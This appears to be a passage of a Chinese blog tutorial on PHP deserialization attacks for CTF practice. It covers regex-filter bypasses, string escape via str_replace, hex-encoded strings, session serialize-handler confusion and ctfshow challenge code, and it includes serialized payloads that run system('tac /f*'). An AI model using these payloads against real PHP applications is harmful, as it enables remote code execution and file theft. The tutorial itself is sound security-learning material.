<p>利用方式1：当在代码中使用类似<code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>的正则语句来匹配是否是对象字符串开头的时候，可以使用<code>+</code>绕过</p>
<p><code>O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code><br><code>O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code></p>
<p>要注意在<code>url</code>里传参时<code>+</code>要编码为<code>%2B</code></p>
<p>利用方式2：使用<code>array()</code>绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backdoor</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="检测’-’"><a href="#检测’-’" class="headerlink" title="检测’}’"></a>检测’}’</h3><p>有时候会遇到另一种正则，比如<code>/\&#125;$/</code>，会匹配最后一个<code>&#125;</code></p>
<p>反序列化字符串末尾的<code>&#125;&#125;&#125;&#125;</code>是可以全部删掉的，没有影响</p>
<p>比如<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;</code></p>
<p>变成<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;</code></p>
<p>甚至在末尾填充字符<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa</code></p>
<p>均能正常解析</p>
<h3 id="检测数字"><a href="#检测数字" class="headerlink" title="检测数字"></a>检测数字</h3><p>可以用字符<code>i</code>、<code>d</code>绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h2><p>利用方式：当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使<code>$a</code>永远与<code>$b</code>相等</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>$this-&gt;b = &amp;$this-&gt;a;</code>表示<code>$b</code>变量指向的地址永远指向<code>$a</code>变量指向的地址</p>
<h2 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h2><p>利用方式：当代码中存在关键词检测时，将表示字符类型的<code>s</code>改为大写来绕过检测</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>如果过滤了关键字<code>admin</code>，可以将其替换成<code>O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;</code></p>
<p>表示字符类型的s为大写时，就会被当成16进制解析</p>
<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<p>由于<code>php</code>在进行反序列化时，是从左到右读取，读取多少取决于<code>s</code>后面的字符长度，且认为读到<code>&#125;</code>就结束了，<code>&#125;</code>后面的字符不会有影响</p>
<p>一般触发字符逃逸的条件是替换函数<code>str_replace</code>，使字符串长度改变，造成字符逃逸，读取到不一样的数据</p>
<h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以发现结果中的<code>aaa</code>被替换成了<code>aaaa</code>，但是长度值没变，还是<code>3</code>，这就导致多出了一个<code>a</code>，而且值是可控的，我们可以将这部分值变为 <code>很多aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;</code>， <code>很多aaa</code>的具体个数取决于后面想要构造的字符串的长度，这里是<code>21</code>位，就用<code>21</code>组<code>aaa</code>，这样替换后会多出<code>21</code>个字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>$b</code>的值成功被修改成了<code>qaq</code></p>
<h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><p>原理与<code>过滤后字符变多</code>大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>主要注意闭合就行了，与sql注入类似</p>
<h2 id="类属性不敏感"><a href="#类属性不敏感" class="headerlink" title="类属性不敏感"></a>类属性不敏感</h2><p>对于<code>PHP</code>版本<code>7.1+</code>，对属性的类型不敏感</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$hello</span>=<span class="hljs-string">&quot;private&quot;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;hello);<br>	&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//string(6) &quot;public&quot;</span><br></code></pre></td></tr></table></figure>

<p>令<code>public</code>时得到的序列化字符串，在<code>priviate</code>或者<code>protected</code>修饰的时候反序列化，<code>hello</code>属性都能获得值</p>
<h2 id="类名和方法名不区分大小写"><a href="#类名和方法名不区分大小写" class="headerlink" title="类名和方法名不区分大小写"></a>类名和方法名不区分大小写</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">PHP特性：<br>变量名区分大小写<br>常量名区分大小写<br>数组索引 (键名) 区分大小写<br>函数名, 方法名, 类名不区分大小写<br>魔术常量不区分大小写 (以双下划线开头和结尾的常量)<br>NULL TRUE FALSE 不区分大小写<br>强制类型转换不区分大小写 (在变量前面加上 (type))<br></code></pre></td></tr></table></figure>

<p>常见用来绕过正则</p>
<p>如ctfshow的一道题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-04 23:52:24</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p>什么是session这里就不描述了，网上有很多文章可以参考</p>
<p>先了解下<code>PHP session</code>不同引擎的存储机制</p>
<p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的</p>
<p>session.serialize_handler定义的引擎共有三种：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的数组</td>
</tr>
</tbody></table>
<p>当<code>php</code>和<code>php_serialize</code>这两个处理区混合起来使用，就会出现<code>session</code>反序列化漏洞。原因是<code>php_serialize</code>存储的反序列化字符可以引用<code>|</code>，如果这时候使用<code>php</code>处理器的格式取出<code>$_SESSION</code>的值，<code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞</p>
<h2 id="SESSION变量可控"><a href="#SESSION变量可控" class="headerlink" title="$_SESSION变量可控"></a>$_SESSION变量可控</h2><p>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><br><span class="hljs-comment">//2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先在<code>1.php</code>传入<code>?session=lewiserii</code></p>
<p><code>session</code>的内容，因为1.php页面用的是<code>php_serialize</code>引擎，所以是序列化处理的数组的形式</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-1.png"></p>
<p>而2.php用的是<code>php</code>引擎，在可控点传入<code>|</code>+<code>序列化字符串</code>，然后再次访问2.php调用session值的时候会触发</p>
<p>传入<code>?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;</code>后，文件中的值就变成了下图中的值</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-2.png"></p>
<p>再次访问2.php，发现成功反序列化，修改了<code>$name</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-3.png"></p>
<blockquote>
<p>总结：由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</p>
</blockquote>
<h2 id="SESSION变量不可控"><a href="#SESSION变量不可控" class="headerlink" title="$_SESSION变量不可控"></a>$_SESSION变量不可控</h2><p>当<code>$_SESSION</code>不能直接控制时，可以借助<code>PHP_SESSION_UPLOAD_PROGRESS</code>来完成反序列化</p>
<p>关于<code>PHP_SESSION_UPLOAD_PROGRESS</code>的介绍可以参考我的另一篇文章<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session.upload_progress文件包含</a></p>
<p>这里用ctfshow的一道新春题的前半部分作例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.serialize_handler&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$happy</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$happy</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$happy</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy=<span class="hljs-string">&quot;Happy_New_Year!!!&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;happy;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$funName</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;happy;<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_New_</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$daniu</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robot</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$notrobot</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_New_</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-string">&quot;I&#x27;m daniu.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;robot=<span class="hljs-string">&quot;I&#x27;m robot.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;notrobot=<span class="hljs-string">&quot;I&#x27;m not a robot.&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$funName</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable 